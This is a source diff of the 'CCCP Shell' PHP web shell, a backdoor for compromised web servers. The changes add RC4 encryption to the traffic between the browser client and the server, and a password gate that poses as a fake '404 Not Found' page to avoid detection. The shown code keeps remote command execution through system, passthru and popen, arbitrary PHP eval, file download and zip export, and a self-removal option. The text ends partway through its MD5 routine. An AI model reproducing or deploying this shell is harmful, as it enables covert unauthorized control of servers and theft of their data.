@@ -3,6 +3,7 @@
  *	CCCP Shell
  *	by DSR!
  *	https://github.com/xchwarze/CCCPShell
+ *  v 1.0 RC3 16072014
  */
 
 # System variables
@@ -61,7 +62,7 @@ if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $user
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("sBuff-Type: text/html; charset=$config[charset]");
+	header("Content-Type: text/html; charset=$config[charset]");
 
 function mHide($name, $value){
 	return "<input id='$name' name='$name' type='hidden' value='$value' />";
@@ -126,209 +127,61 @@ function fix_magic_quote($arr){
 	return $arr;
 }
 
+function rc4Init($pwd) {
+	$key = array();
+	$box = array();
+	$pwd_length = strlen($pwd);
+	
+	for ($i = 0; $i < 256; $i++) {
+		$key[$i] = ord($pwd[$i % $pwd_length]);
+		$box[$i] = $i;
+	}
+	
+	for ($j = $i = 0; $i < 256; $i++) {
+		$j = ($j + $box[$i] + $key[$i]) % 256;
+		$tmp = $box[$i];
+		$box[$i] = $box[$j];
+		$box[$j] = $tmp;
+	}
+	
+	return $box;
+}
+
+function rc4($data, $box) {
+	$cipher = '';
+	$data_length = strlen($data);
+	
+	for ($a = $j = $i = 0; $i < $data_length; $i++) {
+		$a = ($a + 1) % 256;
+		$j = ($j + $box[$a]) % 256;
+		
+		$tmp = $box[$a];
+		$box[$a] = $box[$j];
+		$box[$j] = $tmp;
+		$cipher .= chr(ord($data[$i]) ^ $box[(($box[$a] + $box[$j]) % 256)]);
+	}
+	
+	return $cipher;
+}
+
 function getCrypt(){
 	$p = '';
-	global $config;
 	if (isset($_POST['dsr'])) $p = fix_magic_quote($_POST['dsr']);
 	else if (isset($_GET['dsr'])) $p = fix_magic_quote($_GET['dsr']);
-	if ($p !== '') {
+	if (!empty($p)){
+		global $config;
 		$data = array();
 		$p = rc4(base64_decode($p), rc4Init($config['sPass']));
 		foreach(explode('&', $p) as $tmp) {
 			$tmp = explode('=', $tmp);
-			$data[$tmp[0]] = rawurldecode($tmp[1]);
+			if (!empty($tmp[0])){
+				if (strpos($tmp[0], '[]') !== false) $data[str_replace('[]', '', $tmp[0])][] = rawurldecode($tmp[1]);
+				else $data[$tmp[0]] = rawurldecode($tmp[1]);
+			}
 		}
 		$p = $data;
 	}
 	return $p;
-}
-
-function getCJS(){
-	return "
-	function rc4Init(key) {
-				j = 0;
-				box = [];
-				keylength = key.length;
-
-				for (i = 0; i < 256; i++) {
-					box[i] = i;
-				}
-				
-				for (i = 0; i < 256; i++) {
-					j = (j + box[i] + key.charCodeAt(i % keylength)) % 256;
-					tmp = box[i];
-					box[i] = box[j];
-					box[j] = tmp;
-				}
-
-				return box;
-			}
-
-			function rc4(data, box) { 	
-				i = 0;
-				j = 0;
-				res = '';
-				datalength = data.length;
-				for (y = 0; y < datalength; y++) {
-					i = (i + 1) % 256;
-					j = (j + box[i]) % 256;
-					tmp = box[i];
-					box[i] = box[j];
-					box[j] = tmp;
-					res += String.fromCharCode(data.charCodeAt(y) ^ box[(box[i] + box[j]) % 256]);
-				}
-				
-				return res;
-			}	
-			
-				
-			
-			function add32(a, b) {
-				return (a + b) & 0xFFFFFFFF;
-			}
-			
-			function cmn(q, a, b, x, s, t) {
-				a = add32(add32(a, q), add32(x, t));
-				return add32((a << s) | (a >>> (32 - s)), b);
-			}
-
-			function ff(a, b, c, d, x, s, t) {
-				return cmn((b & c) | ((~b) & d), a, b, x, s, t);
-			}
-
-			function gg(a, b, c, d, x, s, t) {
-				return cmn((b & d) | (c & (~d)), a, b, x, s, t);
-			}
-
-			function hh(a, b, c, d, x, s, t) {
-				return cmn(b ^ c ^ d, a, b, x, s, t);
-			}
-
-			function ii(a, b, c, d, x, s, t) {
-				return cmn(c ^ (b | (~d)), a, b, x, s, t);
-			}
-			
-			function md5cycle(x, k) {
-				a = x[0];
-				b = x[1];
-				c = x[2];
-				d = x[3];
-
-				a = ff(a, b, c, d, k[0], 7, -680876936);
-				d = ff(d, a, b, c, k[1], 12, -389564586);
-				c = ff(c, d, a, b, k[2], 17, 606105819);
-				b = ff(b, c, d, a, k[3], 22, -1044525330);
-				a = ff(a, b, c, d, k[4], 7, -176418897);
-				d = ff(d, a, b, c, k[5], 12, 1200080426);
-				c = ff(c, d, a, b, k[6], 17, -1473231341);
-				b = ff(b, c, d, a, k[7], 22, -45705983);
-				a = ff(a, b, c, d, k[8], 7, 1770035416);
-				d = ff(d, a, b, c, k[9], 12, -1958414417);
-				c = ff(c, d, a, b, k[10], 17, -42063);
-				b = ff(b, c, d, a, k[11], 22, -1990404162);
-				a = ff(a, b, c, d, k[12], 7, 1804603682);
-				d = ff(d, a, b, c, k[13], 12, -40341101);
-				c = ff(c, d, a, b, k[14], 17, -1502002290);
-				b = ff(b, c, d, a, k[15], 22, 1236535329);
-
-				a = gg(a, b, c, d, k[1], 5, -165796510);
-				d = gg(d, a, b, c, k[6], 9, -1069501632);
-				c = gg(c, d, a, b, k[11], 14, 643717713);
-				b = gg(b, c, d, a, k[0], 20, -373897302);
-				a = gg(a, b, c, d, k[5], 5, -701558691);
-				d = gg(d, a, b, c, k[10], 9, 38016083);
-				c = gg(c, d, a, b, k[15], 14, -660478335);
-				b = gg(b, c, d, a, k[4], 20, -405537848);
-				a = gg(a, b, c, d, k[9], 5, 568446438);
-				d = gg(d, a, b, c, k[14], 9, -1019803690);
-				c = gg(c, d, a, b, k[3], 14, -187363961);
-				b = gg(b, c, d, a, k[8], 20, 1163531501);
-				a = gg(a, b, c, d, k[13], 5, -1444681467);
-				d = gg(d, a, b, c, k[2], 9, -51403784);
-				c = gg(c, d, a, b, k[7], 14, 1735328473);
-				b = gg(b, c, d, a, k[12], 20, -1926607734);
-
-				a = hh(a, b, c, d, k[5], 4, -378558);
-				d = hh(d, a, b, c, k[8], 11, -2022574463);
-				c = hh(c, d, a, b, k[11], 16, 1839030562);
-				b = hh(b, c, d, a, k[14], 23, -35309556);
-				a = hh(a, b, c, d, k[1], 4, -1530992060);
-				d = hh(d, a, b, c, k[4], 11, 1272893353);
-				c = hh(c, d, a, b, k[7], 16, -155497632);
-				b = hh(b, c, d, a, k[10], 23, -1094730640);
-				a = hh(a, b, c, d, k[13], 4, 681279174);
-				d = hh(d, a, b, c, k[0], 11, -358537222);
-				c = hh(c, d, a, b, k[3], 16, -722521979);
-				b = hh(b, c, d, a, k[6], 23, 76029189);
-				a = hh(a, b, c, d, k[9], 4, -640364487);
-				d = hh(d, a, b, c, k[12], 11, -421815835);
-				c = hh(c, d, a, b, k[15], 16, 530742520);
-				b = hh(b, c, d, a, k[2], 23, -995338651);
-
-				a = ii(a, b, c, d, k[0], 6, -198630844);
-				d = ii(d, a, b, c, k[7], 10, 1126891415);
-				c = ii(c, d, a, b, k[14], 15, -1416354905);
-				b = ii(b, c, d, a, k[5], 21, -57434055);
-				a = ii(a, b, c, d, k[12], 6, 1700485571);
-				d = ii(d, a, b, c, k[3], 10, -1894986606);
-				c = ii(c, d, a, b, k[10], 15, -1051523);
-				b = ii(b, c, d, a, k[1], 21, -2054922799);
-				a = ii(a, b, c, d, k[8], 6, 1873313359);
-				d = ii(d, a, b, c, k[15], 10, -30611744);
-				c = ii(c, d, a, b, k[6], 15, -1560198380);
-				b = ii(b, c, d, a, k[13], 21, 1309151649);
-				a = ii(a, b, c, d, k[4], 6, -145523070);
-				d = ii(d, a, b, c, k[11], 10, -1120210379);
-				c = ii(c, d, a, b, k[2], 15, 718787259);
-				b = ii(b, c, d, a, k[9], 21, -343485551);
-
-				x[0] = add32(a, x[0]);
-				x[1] = add32(b, x[1]);
-				x[2] = add32(c, x[2]);
-				x[3] = add32(d, x[3]);
-			}
-
-			function md5(s) {
-				txt = '';
-				n = s.length;
-				state = [1732584193, -271733879, -1732584194, 271733878];
-				//var i;
-				for (i = 64; i <= s.length; i += 64) {
-					md5cycle(state, md5blk(s.substring(i - 64, i)));
-				}
-				s = s.substring(i - 64);
-				tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
-				for (i = 0; i < s.length; i++)
-					tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
-				tail[i >> 2] |= 0x80 << ((i % 4) << 3);
-				if (i > 55) {
-					md5cycle(state, tail);
-					for (i = 0; i < 16; i++) tail[i] = 0;
-				}
-				tail[14] = n * 8;
-				md5cycle(state, tail);
-				return hex(state);
-			}
-
-			function md5blk(s) { 
-				md5blks = [];
-				for (i = 0; i < 64; i += 4) {
-					md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) + (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
-				}
-				return md5blks;
-			}
-
-			function hex(x) {
-				hex_chr = '0123456789abcdef'.split('');
-				for (i = 0; i < x.length; i++){
-					s = '';
-					for (j = 0; j < 4; j++)
-						s += hex_chr[(x[i] >> (j * 8 + 4)) & 0x0F] + hex_chr[(x[i] >> (j * 8)) & 0x0F];
-					x[i] = s;
-				}
-				return x.join('');
-			}
-	";
 }
 
 function getSelf(){
@@ -376,43 +229,6 @@ function showIcon($file){
     return "<div class='image $image'></div>";
 }
 
-function rc4Init($pwd) {
-	$key = array();
-	$box = array();
-	$pwd_length = strlen($pwd);
-	
-	for ($i = 0; $i < 256; $i++) {
-		$key[$i] = ord($pwd[$i % $pwd_length]);
-		$box[$i] = $i;
-	}
-	
-	for ($j = $i = 0; $i < 256; $i++) {
-		$j = ($j + $box[$i] + $key[$i]) % 256;
-		$tmp = $box[$i];
-		$box[$i] = $box[$j];
-		$box[$j] = $tmp;
-	}
-	
-	return $box;
-}
-
-function rc4($data, $box) {
-	$cipher = '';
-	$data_length = strlen($data);
-	
-	for ($a = $j = $i = 0; $i < $data_length; $i++) {
-		$a = ($a + 1) % 256;
-		$j = ($j + $box[$a]) % 256;
-		
-		$tmp = $box[$a];
-		$box[$a] = $box[$j];
-		$box[$j] = $tmp;
-		$cipher .= chr(ord($data[$i]) ^ $box[(($box[$a] + $box[$j]) % 256)]);
-	}
-	
-	return $cipher;
-}
-
 # General functions
 function hsc($s){
 	return htmlspecialchars($s, 2|1);
@@ -438,13 +254,13 @@ function execute($c, $i = false){
         } elseif (function_exists('system') && !in_array('system', $dis_func)){
             @ob_start();
             @system($c);
-            $r = @ob_get_sBuffs();
+            $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'system';
         } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)){
             @ob_start();
             @passthru($c);
-            $r = @ob_get_sBuffs();
+            $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'passthru';
         } elseif (function_exists('popen') && !in_array('popen', $dis_func)){
@@ -529,8 +345,7 @@ function getUpPath($nowpath){
 
 function sAjax($i){
 	global $config;
-	$i = base64_encode(rc4($i, rc4Init($config['sPass'])));
-    exit($i);
+	exit(base64_encode(rc4($i, rc4Init($config['sPass']))));
 }
 
 function sDialog($i){
@@ -812,6 +627,27 @@ function filesize64($file){
 $sBuff = '';  	
 $p = getCrypt();
 
+# Validate now
+if ($config['sPass']){
+	@session_start();
+	if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])){ 
+		if (isset($p['pa']) && (md5($p['pa']) === $config['sPass'])){ 
+			$_SESSION[ md5($_SERVER['HTTP_HOST']) ] = true; 
+		} else {
+			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
+				 '<html><head>' .
+				 '<title>404 Not Found</title>' .
+				 '</head><body>' .
+				 '<h1>Not Found</h1>' .
+				 '<p>The requested URL ' . $_SERVER['HTTP_HOST'] . ' was not found on this server.</p>' .
+				 '</body>' .
+				 '<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>' .
+				 '<center><form method=post><input type="password" name="pa"></form></center>' .
+				 '</html>';
+			exit;
+		}
+	}
+}
 	
 # Sections
 if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
@@ -824,18 +660,17 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}			 
 	$sysMenu .= '<a href="#" onclick="ajaxLoad(\'me=srm\');"><b>' . tText('srm', 'Self Remove') . '</b></a> ' . (($config['sPass']) ? ' | <a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) window.close();return false;"><b>' . tText('logout', 'Logout') . '</b></a>' : '');
 						
-	$loader = '<!DOCTYPE html>
+	$loader = '
+		<!DOCTYPE html>
 	<html>
 	<head>
-	  <meta http-equiv=sBuff-Type sBuff="text/html; charset=iso-8859-1">
-	  <meta http-equiv=Pragma sBuff=no-cache>
-	  <meta http-equiv=Expires sBuff="wed, 26 Feb 1997 08:21:57 GMT">
-	  <meta name="robots" sBuff="noindex, nofollow, noarchive" />
+	  <meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+	  <meta http-equiv=Pragma content=no-cache>
+	  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
+	  <meta name="robots" content="noindex, nofollow, noarchive" />
 	  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
 	  <title>CCCP Modular Shell</title>  
-	</head>
-	<body>
-		  <script type="text/javascript">
+	  <script type="text/javascript">
 	var h = 0;
 	var j = 1;
 	var d = document;
@@ -931,6 +766,16 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		return q.join("&");
 	}
 	
+	function getCrypt(d, t){
+		b = rc4Init(hash);
+		if (t === "e")
+			$r = "dsr=" + euc(btoa(rc4(d, b)));
+		else
+			$r = rc4(atob(d), b);
+		
+		return $r;
+	}
+	
 	function ajax(p, cf){
 		var ao = {};
 		lastAjax = p;
@@ -942,7 +787,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			};
 		};
 		ao.stateChange = function (object){
-			if (ao.request.readyState == 4) ao.cf(ao.request.responseText);
+			if (ao.request.readyState == 4) ao.cf(getCrypt(ao.request.responseText, "d"));
 		};
 		if (window.XMLHttpRequest){
 			req = ao.request;
@@ -951,20 +796,9 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
 			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			req.setRequestHeader("Connection", "close");
-			req.send(p);
+			req.send(getCrypt(p, "e"));
 		}
 		return ao;
-	}
-
-	function htmlsafe(s){
-		if(typeof(s) == "string"){
-			s = s.replace(/&/g, "&amp;");
-			s = s.replace(/"/g, "&quot;");
-			s = s.replace(/\'/g, "&#039;");
-			s = s.replace(/</g, "&lt;");
-			s = s.replace(/>/g, "&gt;");
-		}
-		return s;
 	}
 
 	function dpath(e, t){
@@ -1138,7 +972,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	function processUI(a, o, n){
 		if (a === "comp"){
 			hide_box();
-			append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?me=file&md=tools&ac=comp&" + o + "\'></iframe>");
+			append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
 		} else {
 			if (a !== "rdel" && n === "") return;
 			if (a !== "copy" && a !== "rdel") o = euc(o);
@@ -1154,7 +988,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	function dl(o){
 		remove("dlf");
-		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)) + "\'></iframe>");
+		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?" + getCrypt("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
 	}
 	
 	function up(){
@@ -1213,9 +1047,9 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function change(l, b){
-		d.getElementById(l).style.display = \'none\';
-		d.getElementById(b).style.display = \'block\';
-		if (d.getElementById(\'goui\')) d.getElementById(\'goui\').focus();
+		d.getElementById(l).style.display = "none";
+		d.getElementById(b).style.display = "block";
+		if (d.getElementById("goui")) d.getElementById("goui").focus();
 	}
 	
 	function hilite(e){
@@ -1359,7 +1193,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		.boxtitle a, .boxtitle a:hover{
 			color:#aaa;
 		}
-		.boxsBuff{
+		.boxcontent{
 			padding:2px 0 2px 0;
 		}
 		.boxresult{
@@ -1525,6 +1359,8 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
 		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
 	  </style>
+	</head>
+	<body>
 	  <center>
 		<table style="border-collapse: collapse" height="1" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
 		  <tr>
@@ -1548,7 +1384,8 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	  --[ <a href="http://indetectables.net" target="_blank">CCCP Modular Shell v1.0 by DSR!</a> <b>|</b> Generation time: <span id="uetime">0.00</span> ]--
 	  </center>
 	</body>
-	</html>';
+	</html>
+	';
 	
 	sAjax($loader);
 }
@@ -1754,11 +1591,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
                     } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                         $find = 0;
                         if ($re){
-                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))){
+                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_contents($f))){
                                 $find = 1;
                             }
                         } else {
-                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)){
+                            if (strstr($file, $sBuff) || strstr(@file_get_contents($f), $sBuff)){
                                 $find = 1;
                             }
                         }
@@ -1811,10 +1648,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				if ($p['dl']){
 					$zip = new PHPZip();
 					$zip->Zipper($p['fl'], $p['dl']);
-					header('sBuff-type: application/octet-stream');
+					header('Content-Type: application/octet-stream');
 					header('Accept-Ranges: bytes');
 					header('Accept-Length: ' . strlen($compress));
-					header('sBuff-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
+					header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
 					echo $zip->file();
 					exit;
 				}
@@ -1864,9 +1701,9 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sAjax(tText('notexist', 'Object does not exist'));
 				else {
 					$fileinfo = pathinfo($p['fl']);
-					header('sBuff-Type: application/x-' . $fileinfo['extension']);
-					header('sBuff-Disposition: attachment; filename=' . $fileinfo['basename']);
-					header('sBuff-Length: ' . filesize($p['fl']));
+					header('Content-Type: application/x-' . $fileinfo['extension']);
+					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
+					header('Content-Length: ' . filesize($p['fl']));
 					@readfile($p['fl']);
 					exit;
 				}
@@ -1975,17 +1812,17 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			} else if (isset($p['hl'])){
 				if (function_exists('highlight_file')){
 					if ($p['hl'] === 'n'){
-						$sBuff .= '<b>Highlight sBuff:</b><br>' .
+						$sBuff .= '<b>Highlight:</b><br>' .
 									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
 					} else {
 						$code = substr(highlight_file($p['t'], true), 36, -15);
-						$lines = explode('<br>', $code);
-						$padLength = strlen(count($lines));
-						$sBuff .= '<b>Highlight + sBuff:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
+						//if (substr_count($code, '<br>') > substr_count($code, "\n"))
+						$lines = explode('<br />', $code);
+						$pl = strlen(count($lines));
+						$sBuff .= '<b>Highlight +:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
 						
 						foreach($lines as $i => $line){
-							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
-							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
+							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
 						}
 
 						$sBuff .= '</div>';
@@ -1994,7 +1831,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sDialog(tText('hlerror', 'highlight_file() dont exist!'));
 			} else {
 				$str = @fread($fp, filesize($p['t']));
-				$sBuff .= '<b>File sBuff:</b><br>' .
+				$sBuff .= '<b>File:</b><br>' .
 							'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
 			}
 		} else
@@ -2824,12 +2661,12 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 
 			//hago esta chapuzada para que no se muestre el resultado arriba
 			echo 'Result of the executed code:';
-			$buf = ob_get_sBuffs();
+			$buf = ob_get_contents();
 
 			if ($buf){
 				ob_clean();
 				eval("?" . ">$code");
-				$ret = ob_get_sBuffs();
+				$ret = ob_get_contents();
 				$ret = convert_cyr_string($ret, 'd', 'w');
 				ob_clean();
 				$sBuff .= $buf;
@@ -2837,7 +2674,7 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 				if (isset($p['dta'])) 
 					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
 				else 
-					$sBuff .= $ret . '<br><pre></pre>';
+					$sBuff .= "<br><pre>{$ret}</pre>";
 			} else
 				eval("?" . ">$code");
         }
@@ -2992,34 +2829,222 @@ if (isset($p['me']) && $p['me'] === 'process'){
 
 #Se fini
 if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
-	exit($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
+	sAjax($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>404 Not Found</title>
 <script type="text/javascript">
-<?php echo getCJS(); 
-	$loader = "ajax = new XMLHttpRequest();
+	function rc4Init(key) {
+		j = 0;
+		box = [];
+		keylength = key.length;
+
+		for (i = 0; i < 256; i++) {
+			box[i] = i;
+		}
+		
+		for (i = 0; i < 256; i++) {
+			j = (j + box[i] + key.charCodeAt(i % keylength)) % 256;
+			tmp = box[i];
+			box[i] = box[j];
+			box[j] = tmp;
+		}
+
+		return box;
+	}
+
+	function rc4(data, box) { 	
+		i = 0;
+		j = 0;
+		res = '';
+		datalength = data.length;
+		for (y = 0; y < datalength; y++) {
+			i = (i + 1) % 256;
+			j = (j + box[i]) % 256;
+			tmp = box[i];
+			box[i] = box[j];
+			box[j] = tmp;
+			res += String.fromCharCode(data.charCodeAt(y) ^ box[(box[i] + box[j]) % 256]);
+		}
+		
+		return res;
+	}	
+	
+	//MD5 - DSR!
+	function add32(a, b) {
+		return (a + b) & 0xFFFFFFFF;
+	}
+	
+	function cmn(q, a, b, x, s, t) {
+		a = add32(add32(a, q), add32(x, t));
+		return add32((a << s) | (a >>> (32 - s)), b);
+	}
+
+	function ff(a, b, c, d, x, s, t) {
+		return cmn((b & c) | ((~b) & d), a, b, x, s, t);
+	}
+
+	function gg(a, b, c, d, x, s, t) {
+		return cmn((b & d) | (c & (~d)), a, b, x, s, t);
+	}
+
+	function hh(a, b, c, d, x, s, t) {
+		return cmn(b ^ c ^ d, a, b, x, s, t);
+	}
+
+	function ii(a, b, c, d, x, s, t) {
+		return cmn(c ^ (b | (~d)), a, b, x, s, t);
+	}
+	
+	function md5cycle(x, k) {
+		a = x[0];
+		b = x[1];
+		c = x[2];
+		d = x[3];
+
+		a = ff(a, b, c, d, k[0], 7, -680876936);
+		d = ff(d, a, b, c, k[1], 12, -389564586);
+		c = ff(c, d, a, b, k[2], 17, 606105819);
+		b = ff(b, c, d, a, k[3], 22, -1044525330);
+		a = ff(a, b, c, d, k[4], 7, -176418897);
+		d = ff(d, a, b, c, k[5], 12, 1200080426);
+		c = ff(c, d, a, b, k[6], 17, -1473231341);
+		b = ff(b, c, d, a, k[7], 22, -45705983);
+		a = ff(a, b, c, d, k[8], 7, 1770035416);
+		d = ff(d, a, b, c, k[9], 12, -1958414417);
+		c = ff(c, d, a, b, k[10], 17, -42063);
+		b = ff(b, c, d, a, k[11], 22, -1990404162);
+		a = ff(a, b, c, d, k[12], 7, 1804603682);
+		d = ff(d, a, b, c, k[13], 12, -40341101);
+		c = ff(c, d, a, b, k[14], 17, -1502002290);
+		b = ff(b, c, d, a, k[15], 22, 1236535329);
+
+		a = gg(a, b, c, d, k[1], 5, -165796510);
+		d = gg(d, a, b, c, k[6], 9, -1069501632);
+		c = gg(c, d, a, b, k[11], 14, 643717713);
+		b = gg(b, c, d, a, k[0], 20, -373897302);
+		a = gg(a, b, c, d, k[5], 5, -701558691);
+		d = gg(d, a, b, c, k[10], 9, 38016083);
+		c = gg(c, d, a, b, k[15], 14, -660478335);
+		b = gg(b, c, d, a, k[4], 20, -405537848);
+		a = gg(a, b, c, d, k[9], 5, 568446438);
+		d = gg(d, a, b, c, k[14], 9, -1019803690);
+		c = gg(c, d, a, b, k[3], 14, -187363961);
+		b = gg(b, c, d, a, k[8], 20, 1163531501);
+		a = gg(a, b, c, d, k[13], 5, -1444681467);
+		d = gg(d, a, b, c, k[2], 9, -51403784);
+		c = gg(c, d, a, b, k[7], 14, 1735328473);
+		b = gg(b, c, d, a, k[12], 20, -1926607734);
+
